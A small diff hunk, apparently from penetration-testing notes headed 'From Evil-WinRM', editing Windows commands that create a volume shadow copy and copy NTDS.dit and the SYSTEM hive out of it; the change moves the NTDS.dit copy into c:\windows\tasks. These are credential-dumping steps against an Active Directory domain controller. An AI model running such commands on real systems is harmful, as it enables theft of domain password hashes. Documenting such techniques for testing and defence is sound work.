@@ -3,7 +3,7 @@ From Evil-WinRM
 ```bash
 vssadmin CREATE SHADOW /For=C:
 
-cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
+cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\windows\tasks\NTDS.dit
 
 cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM c:\windows\tasks\system.save
 
